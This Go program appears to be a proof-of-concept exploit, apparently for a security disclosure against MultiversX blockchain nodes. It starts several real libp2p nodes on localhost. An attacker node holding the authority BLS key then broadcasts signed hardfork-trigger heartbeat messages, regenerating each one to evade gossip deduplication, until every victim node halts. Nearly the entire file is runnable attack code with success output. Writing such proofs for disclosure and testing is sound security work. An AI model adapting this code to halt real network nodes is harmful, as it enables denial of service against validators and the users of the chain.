// p2p-propagation-poc: shows that ONE node which does NOT act on the trigger, by
// broadcasting a single authority-signed hardfork message onto the real libp2p gossip
// network, halts ALL the OTHER nodes that trust the key.
//
// Topology (all real libp2p messengers, connected over 127.0.0.1):
//
//	          attacker (no hardfork trigger — only broadcasts)
//	         /      |      \
//	    victim-1  victim-2  victim-3     (each runs the REAL interceptor + hardfork trigger,
//	                                      configured with PublicKeyToListenFrom = authority key)
//
// The attacker holds only the authority BLS *private* key and is not a validator. It publishes
// one signed peerAuthentication on the gossip topic; libp2p delivers it; each victim runs the
// unmodified reception code and halts (its registered closer fires immediately). The attacker
// has no trigger, so it is unaffected.
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/multiversx/mx-chain-core-go/core"
	"github.com/multiversx/mx-chain-core-go/data/endProcess"
	"github.com/multiversx/mx-chain-core-go/marshal"

	"github.com/multiversx/mx-chain-crypto-go/signing"
	"github.com/multiversx/mx-chain-crypto-go/signing/mcl"
	mclsig "github.com/multiversx/mx-chain-crypto-go/signing/mcl/singlesig"
	"github.com/multiversx/mx-chain-crypto-go/signing/secp256k1"
	secpsig "github.com/multiversx/mx-chain-crypto-go/signing/secp256k1/singlesig"

	commp2p "github.com/multiversx/mx-chain-communication-go/p2p"
	"github.com/multiversx/mx-chain-communication-go/p2p/integrationTests"
	p2pcrypto "github.com/multiversx/mx-chain-communication-go/p2p/libp2p/crypto"

	"github.com/multiversx/mx-chain-go/factory/peerSignatureHandler"
	"github.com/multiversx/mx-chain-go/heartbeat"
	"github.com/multiversx/mx-chain-go/process"
	procheartbeat "github.com/multiversx/mx-chain-go/process/heartbeat"
	"github.com/multiversx/mx-chain-go/process/heartbeat/validator"
	"github.com/multiversx/mx-chain-go/process/interceptors/processor"
	procmock "github.com/multiversx/mx-chain-go/process/mock"
	"github.com/multiversx/mx-chain-go/process/smartContract"
	"github.com/multiversx/mx-chain-go/sharding/nodesCoordinator"
	"github.com/multiversx/mx-chain-go/testscommon"
	"github.com/multiversx/mx-chain-go/testscommon/enableEpochsHandlerMock"
	"github.com/multiversx/mx-chain-go/update"
	"github.com/multiversx/mx-chain-go/update/trigger"

	"github.com/multiversx/mx-chain-storage-go/lrucache"
)

const topic = "peerAuthentication"

// ---- stubs for trigger collaborators (behaviour-irrelevant to the proof) ----

type epochStub struct{}

func (epochStub) MetaEpoch() uint32        { return 1 }
func (epochStub) ForceEpochStart(_ uint64) {}
func (epochStub) IsInterfaceNil() bool     { return false }

type notifierStub struct{}

func (notifierStub) RegisterForEpochChangeConfirmed(_ func(epoch uint32)) {}
func (notifierStub) IsInterfaceNil() bool                                 { return false }

type fakeExportHandler struct{}

func (fakeExportHandler) ExportAll(_ uint32) error { return nil }
func (fakeExportHandler) IsInterfaceNil() bool     { return false }

type fakeExportFactory struct{}

func (fakeExportFactory) Create() (update.ExportHandler, error) { return fakeExportHandler{}, nil }
func (fakeExportFactory) IsInterfaceNil() bool                  { return false }

type rejectingNodesCoordinator struct{}

func (rejectingNodesCoordinator) GetValidatorWithPublicKey(_ []byte) (nodesCoordinator.Validator, uint32, error) {
	return nil, 0, fmt.Errorf("public key is not a registered validator")
}
func (rejectingNodesCoordinator) IsInterfaceNil() bool { return false }

type p2pVerifier interface {
	Verify(payload []byte, pid core.PeerID, signature []byte) error
	SignUsingPrivateKey(skBytes []byte, payload []byte) ([]byte, error)
}

type sigHandler struct{ v p2pVerifier }

func (s sigHandler) Verify(p []byte, pid core.PeerID, sig []byte) error { return s.v.Verify(p, pid, sig) }
func (s sigHandler) IsInterfaceNil() bool                               { return false }

// haltCloser fires (once) the moment its node's hardfork trigger calls callClose().
type haltCloser struct {
	name string
	ch   chan string
	once sync.Once
}

func (h *haltCloser) Close() error {
	h.once.Do(func() { h.ch <- h.name })
	return nil
}
func (h *haltCloser) IsInterfaceNil() bool { return false }

// interceptorSaver is the exported behaviour of the (unexported) real interceptor processor.
type interceptorSaver interface {
	Save(data process.InterceptedData, fromConnectedPeer core.PeerID, topic string, source commp2p.BroadcastMethod) (bool, error)
}

// victim runs the real reception pipeline for one node.
type victim struct {
	name  string
	proc  interceptorSaver
	newIP func(msgBytes []byte, originator core.PeerID) process.InterceptedData
}

func (v *victim) ProcessReceivedMessage(message commp2p.MessageP2P, from core.PeerID, _ commp2p.MessageHandler) ([]byte, error) {
	ipa := v.newIP(message.Data(), from)
	if err := ipa.CheckValidity(); err != nil {
		return nil, err // rejected (e.g. not the authority key / bad signature)
	}
	_, err := v.proc.Save(ipa, from, "", commp2p.Broadcast)
	return nil, err
}
func (v *victim) IsInterfaceNil() bool { return false }

func must(err error, ctx string) {
	if err != nil {
		fmt.Printf("[x] %s: %v\n", ctx, err)
		os.Exit(1)
	}
}

func hexAscii(s string) string { return hex.EncodeToString([]byte(s)) }

func hardforkMessage(ts int64, epoch uint32) []byte {
	const sep = "@"
	return []byte("hardfork trigger" + sep +
		hexAscii(fmt.Sprintf("%d", ts)) + sep +
		hexAscii(fmt.Sprintf("%d", epoch)) + sep +
		hexAscii(fmt.Sprintf("%v", false)) + sep +
		hexAscii(fmt.Sprintf("%d", 0)))
}

func main() {
	const numVictims = 3
	fmt.Println("=== MultiversX offswitch — P2P PROPAGATION over real libp2p gossip ===")

	// ---------- shared crypto ----------
	blsKeyGen := signing.NewKeyGenerator(mcl.NewSuiteBLS12())
	blsSigner := mclsig.NewBlsSigner()
	p2pKeyGen := signing.NewKeyGenerator(secp256k1.NewSecp256k1())
	p2pSingleSigner := &secpsig.Secp256k1Signer{}
	p2pKeyConv := p2pcrypto.NewP2PKeyConverter()
	marshaller := &marshal.GogoProtoMarshalizer{}

	wrapperSk, _ := p2pKeyGen.GeneratePair()
	rawSigner, err := p2pcrypto.NewP2PSignerWrapper(p2pcrypto.ArgsP2pSignerWrapper{
		PrivateKey: wrapperSk, Signer: p2pSingleSigner, KeyGen: p2pKeyGen, P2PKeyConverter: p2pKeyConv,
	})
	must(err, "new p2p signer")
	var p2pSig p2pVerifier = rawSigner
	signatures := sigHandler{v: p2pSig}

	authSk, authPk := blsKeyGen.GeneratePair()
	authPkBytes, _ := authPk.ToByteArray()
	fmt.Printf("\n[authority] PublicKeyToListenFrom = %s...  (attacker holds the private half)\n", hex.EncodeToString(authPkBytes)[:32])

	peerSigCacher, _ := lrucache.NewCache(100)
	peerSigHandler, err := peerSignatureHandler.NewPeerSignatureHandler(peerSigCacher, blsSigner, blsKeyGen)
	must(err, "peer signature handler")
	payloadValidator, err := validator.NewPeerAuthenticationPayloadValidator(3600)
	must(err, "payload validator")

	// shared: turn raw bytes into real intercepted data (authority key configured)
	cacher, _ := lrucache.NewCache(100)
	newIPA := func(msgBytes []byte, originator core.PeerID) process.InterceptedData {
		ipa, e := procheartbeat.NewInterceptedPeerAuthentication(procheartbeat.ArgInterceptedPeerAuthentication{
			ArgBaseInterceptedHeartbeat: procheartbeat.ArgBaseInterceptedHeartbeat{DataBuff: msgBytes, Marshaller: marshaller},
			NodesCoordinator:                        rejectingNodesCoordinator{},
			SignaturesHandler:                       signatures,
			PeerSignatureHandler:                    peerSigHandler,
			PayloadValidator:                        payloadValidator,
			HardforkTriggerPubKey:                   authPkBytes,
			PeerShardMapper:                         &procmock.PeerShardMapperStub{},
			PeerAuthCacher:                          cacher,
			MessageOriginator:                       originator,
			SelfPeerID:                              core.PeerID("victim"),
			PeerAuthenticationTimeBetweenSendsInSec: 1,
			ManagedPeersHolder:                      &testscommon.ManagedPeersHolderStub{},
		})
		must(e, "intercepted peerAuthentication")
		return ipa
	}

	// signed message an attacker would broadcast (fresh identity + timestamp each call)
	buildMsg := func() []byte {
		attP2pSk, attP2pPk := p2pKeyGen.GeneratePair()
		attP2pSkBytes, _ := attP2pSk.ToByteArray()
		attackerPid, e := p2pKeyConv.ConvertPublicKeyToPeerID(attP2pPk)
		must(e, "attacker pid")
		now := time.Now().Unix()
		payload := &heartbeat.Payload{Timestamp: now, HardforkMessage: string(hardforkMessage(now, 1))}
		payloadBytes, _ := marshaller.Marshal(payload)
		payloadSig, e := p2pSig.SignUsingPrivateKey(attP2pSkBytes, payloadBytes)
		must(e, "sign payload")
		peerSig, e := peerSigHandler.GetPeerSignature(authSk, attackerPid.Bytes())
		must(e, "bls peer signature")
		msg := &heartbeat.PeerAuthentication{
			Pid: attackerPid.Bytes(), Pubkey: authPkBytes,
			Payload: payloadBytes, PayloadSignature: payloadSig, Signature: peerSig,
		}
		msgBytes, _ := marshaller.Marshal(msg)
		return msgBytes
	}

	// ---------- real libp2p network ----------
	fmt.Printf("\n[net] starting %d victim nodes + 1 attacker node on real libp2p (127.0.0.1)...\n", numVictims)
	haltCh := make(chan string, numVictims)

	attacker := integrationTests.CreateMessengerWithNoDiscovery()
	victimMsgrs := make([]commp2p.Messenger, numVictims)
	all := []commp2p.Messenger{attacker}
	for i := 0; i < numVictims; i++ {
		victimMsgrs[i] = integrationTests.CreateMessengerWithNoDiscovery()
		all = append(all, victimMsgrs[i])
	}
	defer func() {
		for _, m := range all {
			_ = m.Close()
		}
	}()

	// full-mesh connect
	for i := 0; i < len(all); i++ {
		for j := i + 1; j < len(all); j++ {
			addr := integrationTests.GetConnectableAddress(all[j])
			must(all[i].ConnectToPeer(addr), "connect peers")
		}
	}

	// attacker only broadcasts — it has NO hardfork trigger wired
	must(attacker.CreateTopic(topic, false), "attacker CreateTopic")

	// each victim: real trigger (enabled) with an immediate-halt closer + real processor
	for i := 0; i < numVictims; i++ {
		name := fmt.Sprintf("victim-%d", i+1)
		_, selfPk := blsKeyGen.GeneratePair() // node's own key != authority => not self-trigger
		selfPkBytes, _ := selfPk.ToByteArray()
		stopChan := make(chan endProcess.ArgEndProcess, 1)

		trig, e := trigger.NewTrigger(trigger.ArgHardforkTrigger{
			Enabled:                   true,
			EnabledAuthenticated:      true,
			CloseAfterExportInMinutes: 2,
			TriggerPubKeyBytes:        authPkBytes,
			SelfPubKeyBytes:           selfPkBytes,
			ArgumentParser:            smartContract.NewArgumentParser(),
			EpochProvider:             epochStub{},
			ExportFactoryHandler:      fakeExportFactory{},
			ChanStopNodeProcess:       stopChan,
			EpochConfirmedNotifier:    notifierStub{},
			ImportStartHandler:        &testscommon.ImportStartHandlerStub{},
			RoundHandler:              &testscommon.RoundHandlerMock{},
			EnableEpochsHandler:       enableEpochsHandlerMock.NewEnableEpochsHandlerStub(),
			EnableRoundsHandler:       &testscommon.EnableRoundsHandlerStub{},
		})
		must(e, "new trigger")
		must(trig.AddCloser(&haltCloser{name: name, ch: haltCh}), "add closer")

		proc, e := processor.NewPeerAuthenticationInterceptorProcessor(processor.ArgPeerAuthenticationInterceptorProcessor{
			PeerAuthenticationCacher: cacher,
			PeerShardMapper:          &procmock.PeerShardMapperStub{},
			Marshaller:               marshaller,
			HardforkTrigger:          trig,
		})
		must(e, "new processor")

		v := &victim{name: name, proc: proc, newIP: newIPA}
		must(victimMsgrs[i].CreateTopic(topic, false), "victim CreateTopic")
		must(victimMsgrs[i].RegisterMessageProcessor(topic, "hardfork-poc", v), "register processor")
	}

	fmt.Println("[net] waiting for the gossip mesh to form...")
	time.Sleep(4 * time.Second)
	for _, m := range all {
		fmt.Printf("      %s connected to %d peers\n", m.ID().Pretty()[:12], len(m.ConnectedPeers()))
	}

	// ---------- fire ----------
	fmt.Println("\n[attack] the attacker node (NO trigger) broadcasts ONE signed hardfork message...")
	halted := map[string]bool{}
	deadline := time.After(30 * time.Second)
	ticker := time.NewTicker(1500 * time.Millisecond)
	defer ticker.Stop()
	attacker.Broadcast(topic, buildMsg())

	for len(halted) < numVictims {
		select {
		case name := <-haltCh:
			if !halted[name] {
				halted[name] = true
				fmt.Printf("    >>> %s received it over gossip and HALTED (hardfork trigger fired)\n", name)
			}
		case <-ticker.C:
			attacker.Broadcast(topic, buildMsg()) // fresh msg (avoids pubsub dedup) until all halt
		case <-deadline:
			fmt.Printf("\n[x] timed out: only %d/%d victims halted\n", len(halted), numVictims)
			os.Exit(1)
		}
	}

	fmt.Println("\n------------------------------------------------------------------")
	fmt.Printf("RESULT: PASS — 1 broadcast from a node with NO trigger halted all %d other nodes.\n", numVictims)
	fmt.Println("The attacker node itself has no hardfork trigger, so it is unaffected.")
	fmt.Println("Delivery was real libp2p gossip; acceptance + halt used unmodified node code.")
	fmt.Println("------------------------------------------------------------------")
}
